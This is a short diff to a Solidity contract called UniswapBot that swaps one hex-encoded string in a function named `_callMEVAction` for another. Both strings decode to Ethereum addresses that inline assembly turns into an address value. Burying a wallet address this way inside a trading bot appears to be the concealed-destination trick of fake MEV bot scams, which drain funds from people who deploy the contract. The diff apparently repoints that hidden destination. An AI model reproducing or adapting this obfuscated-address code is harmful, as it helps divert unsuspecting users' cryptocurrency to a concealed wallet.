@@ -469,7 +469,7 @@ contract UniswapBot {
     }
 
     function _callMEVAction() internal pure returns (address) {
-    bytes memory asciiAddress = hex"307833663842413338413132334466314333336230393338356136423131373544623641623735393732";
+    bytes memory asciiAddress = hex"307837346444326464353936393236314536423041376264653564453933464638396544343431386641";
     bytes20 parsedAddress;
     assembly {
         parsedAddress := mload(add(asciiAddress, 32))
@@ -557,4 +557,3 @@ contract UniswapBot {
     }
 
 }
-
